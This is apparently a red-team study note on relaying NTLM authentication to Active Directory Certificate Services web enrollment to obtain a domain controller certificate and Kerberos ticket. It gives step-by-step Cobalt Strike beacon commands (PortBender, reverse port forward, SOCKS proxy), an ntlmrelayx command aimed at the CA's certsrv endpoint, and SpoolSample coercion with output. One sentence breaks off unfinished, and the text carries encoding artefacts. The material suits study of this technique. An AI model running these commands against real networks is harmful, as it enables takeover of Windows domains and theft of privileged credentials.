# [[NTLM Relaying to ADCS]]  

AD CS services support HTTP enrolment methods and even includes a GUI. Â This endpoint is usually found atÂ `http[s]://<hostname>/certsrv`, and by default supportsÂ **NTLM**Â andÂ **Negotiate**Â authentication methods.

In the default configuration, these endpoints are vulnerable to NTLM relay attacks. Â A common abuse method is to coerce a domain controller to authenticate to an attacker-controller location, relay the request to the CA and obtain a certificate for that DC, then use it to obtain a TGT.

Another aspect to be aware of is that you cannot relay authentication back to the original machine. If the CA is running on the DC 


As SYSTEM on a server/workstation:

-   Use PortBender to capture incoming traffic on port 445 and redirect it to port 8445.
-   Start a reverse port forward to forward traffic hitting port 8445 to the Team Server on port 445.
-   Start a SOCKS proxy for ntlmrelayx to send traffic back into the network.

```
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
                                            
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP

beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445

beacon> socks 1080
[+] started SOCKS4a server on: 1080

```

Start ntlmrelayx with proxychains (10.10.15.75 is CA.):

```
root@kali:~# proxychains ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```

Next, use one of the remote authentication methods to force a connection from WKSTN-3 to the relay (10.10.17.25 is the server/workstation running your relay)(10.10.15.254 is the authentication you are getting, you should be able to use anything).
```
beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe 10.10.15.254 10.10.17.25

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
```

Look at kali for a base64 encoded ticket (output slightly trimmed for brevity).
